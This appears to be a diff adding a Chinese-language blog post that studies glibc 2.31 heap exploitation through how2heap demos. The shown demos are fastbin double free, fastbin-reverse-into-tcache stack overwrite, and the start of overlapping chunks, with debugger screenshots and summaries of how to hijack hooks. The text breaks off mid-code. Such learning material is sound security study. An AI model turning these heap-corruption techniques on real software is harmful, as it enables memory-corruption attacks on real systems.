@@ -1,0 +1,1154 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      How2heap Glibc2.31 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">How2heap Glibc2.31</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-03-19 21:25:29
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
+                    #pwn_堆
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="How2heap-Glibc2-31"><a href="#How2heap-Glibc2-31" class="headerlink" title="How2heap Glibc2.31"></a>How2heap Glibc2.31</h1><p>libc2.31漏洞原理与利用方式</p>
+<h2 id="fastbin-dup-2-31"><a href="#fastbin-dup-2-31" class="headerlink" title="fastbin_dup 2.31"></a>fastbin_dup 2.31</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+ <span class="token punctuation">&#123;</span>
+         <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates a simple double-free attack with fastbins.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fill up tcache first.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">void</span> <span class="token operator">*</span>ptrs<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">free</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+ 
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1st calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2nd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3rd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If we free %p again, things will crash because %p is at the top of the free     list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// free(a);</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p tw    ice!\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        a <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        b <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        c <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1st calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2nd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3rd calloc(1, 8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">assert</span><span class="token punctuation">(</span>a <span class="token operator">==</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>申请8个chunk：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318215401797.png"></p>
+<p>释放7个chunk：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318215857334.png"></p>
+<p>将tcache bin填满</p>
+<p>使用calloc创建3个0x21的堆块：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318220122866.png"></p>
+<p>calloc不会分配tcache中的堆块</p>
+<p>释放chunk a，不清空chunk a的malloc指针&#x3D;&#x3D;》释放chunk b&#x3D;&#x3D;》二次释放chunk a&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318220356584.png"></p>
+<p>申请3个0x20大小的chunk：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318220608798.png"></p>
+<p>&#x3D;&#x3D;》申请的第一个堆块与第三个堆块申请的是同一个堆块</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>1、glibc2.31存在tcache机制&#x3D;&#x3D;》想要使用fastbin double free，想要先将tcache bin填满</p>
+<p>2、fastbin double free可以将一个堆块启用两次&#x3D;&#x3D;》在第一个堆块启用时，向堆块中写入内容&#x3D;&#x3D;》</p>
+<p>可以将新的堆块挂进fastbin 或者写入hook</p>
+<h2 id="fastbin-reverse-into-tcache-2-31"><a href="#fastbin-reverse-into-tcache-2-31" class="headerlink" title="fastbin_reverse_into_tcache 2.31"></a>fastbin_reverse_into_tcache 2.31</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+
+<span class="token keyword">const</span> <span class="token class-name">size_t</span> allocsize <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+   <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"\n"</span>
+     <span class="token string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span>
+     <span class="token string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span>
+     <span class="token string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span>
+     <span class="token string">"a large unsigned value to the stack.\n\n"</span>
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token comment">// Allocate 14 times so that we can free later.</span>
+   <span class="token keyword">char</span><span class="token operator">*</span> ptrs<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token class-name">size_t</span> i<span class="token punctuation">;</span>
+   <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+     ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span>
+     <span class="token string">"(More than 7 times works fine too.)\n\n"</span>
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">// Fill the tcache.</span>
+   <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+     <span class="token function">free</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+
+   <span class="token keyword">char</span><span class="token operator">*</span> victim <span class="token operator">=</span> ptrs<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span>
+     <span class="token string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span>
+     <span class="token string">"already full, it will go in the fastbin.\n\n"</span><span class="token punctuation">,</span>
+     victim
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">free</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span>
+     <span class="token string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span>
+     <span class="token string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span>
+     <span class="token string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span>
+     <span class="token string">"a single free is sufficient.\n\n"</span>
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">// Fill the fastbin.</span>
+   <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+     <span class="token function">free</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+
+   <span class="token comment">// Create an array on the stack and initialize it with garbage.</span>
+   <span class="token class-name">size_t</span> stack_var<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token function">memset</span><span class="token punctuation">(</span>stack_var<span class="token punctuation">,</span> <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"The stack address that we intend to target: %p\n"</span>
+     <span class="token string">"It's current value is %p\n"</span><span class="token punctuation">,</span>
+     <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+     <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span>
+     <span class="token string">"to overwrite the next pointer at address %p\n\n"</span><span class="token punctuation">,</span>
+     victim
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">//------------VULNERABILITY-----------</span>
+
+   <span class="token comment">// Overwrite linked list pointer in victim.</span>
+   <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>victim <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+   <span class="token comment">//------------------------------------</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span>
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token comment">// Empty tcache.</span>
+   <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+     ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"Let's just print the contents of our array on the stack now,\n"</span>
+     <span class="token string">"to show that it hasn't been modified yet.\n\n"</span>
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"\n"</span>
+     <span class="token string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span>
+     <span class="token string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span>
+     <span class="token string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span>
+     <span class="token string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span>
+     <span class="token string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span>
+     <span class="token string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span>
+     <span class="token string">"pointer is written to the stack.\n"</span>
+     <span class="token string">"\n"</span>
+     <span class="token string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span>
+     <span class="token string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span>
+     <span class="token string">"That's because the value on the stack is treated as a next pointer in the\n"</span>
+     <span class="token string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span>
+     <span class="token string">"\n"</span>
+     <span class="token string">"The contents of our array on the stack now look like this:\n\n"</span>
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+
+   <span class="token keyword">char</span> <span class="token operator">*</span>q <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span>
+     <span class="token string">"\n"</span>
+     <span class="token string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span><span class="token punctuation">,</span>
+     q
+   <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">assert</span><span class="token punctuation">(</span>q <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+ <span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>创建14个chunk，将14个malloc指针放在全局ptrs数组中：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318221713265.png"></p>
+<p>释放7个chunk，填满tcache：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318222517622.png"></p>
+<p>释放目标chunk至fastbin：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318222632268.png"></p>
+<p>将剩下的chunk都释放进fastbin中：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318222805876.png"></p>
+<p>此时fastbin中：</p>
+<pre class="language-none"><code class="language-none">13-&gt;12-&gt;11-&gt;10-&gt;9-&gt;8-&gt;7</code></pre>
+
+
+
+<p>创建一个数组stack_var[6]，初始化数组(清空)&#x3D;&#x3D;》</p>
+<p>将目标堆块的fd指针修改为stack_var数组的起始地址</p>
+<pre class="language-none"><code class="language-none">chunk 7--&gt;stack_var_addr</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318223154938.png"></p>
+<p>申请7个chunk，将tcache bin中的空闲块清空：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318223315749.png"></p>
+<p>此时申请一个堆块：</p>
+<pre class="language-none"><code class="language-none">13-&gt;12-&gt;11-&gt;10-&gt;9-&gt;8-&gt;7-&gt;stack_var</code></pre>
+
+<p>&#x3D;&#x3D;》chunk 13被申请出来&#x3D;&#x3D;》</p>
+<p>此时根据tcache机制&#x3D;&#x3D;》剩余未被申请的堆块会以倒序的方式重新被挂进tcache bin中：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318224038952.png"></p>
+<p>再一次申请chunk将会申请到stack_var&#x3D;&#x3D;》若具有编辑堆块功能，将能对stcak_var的内容进行编辑&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220318224948950.png"></p>
+<h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>1、能够向被释放堆块中fd指针位置写入数据&#x3D;&#x3D;》必须使用绝对地址才能达到利用效果</p>
+<p>2、利用tcachebin将其他bin逆序写入&#x3D;&#x3D;》将其他bin中最后一个堆块作为第一个堆块使用</p>
+<h2 id="overlapping-chunks-2-31"><a href="#overlapping-chunks-2-31" class="headerlink" title="overlapping_chunks 2.31"></a>overlapping_chunks 2.31</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+ 
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">long</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThis is another simple chunks overlapping problem\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The previous technique is killed by patch: 			         https://sourceware.org/git/p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n"</span>
+                   <span class="token string">"which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n"</span>
+                   <span class="token string">"and the prev_size of it must match the unsortedbin's size\n"</span>
+                   <span class="token string">"This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's start to allocate 4 chunks on the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
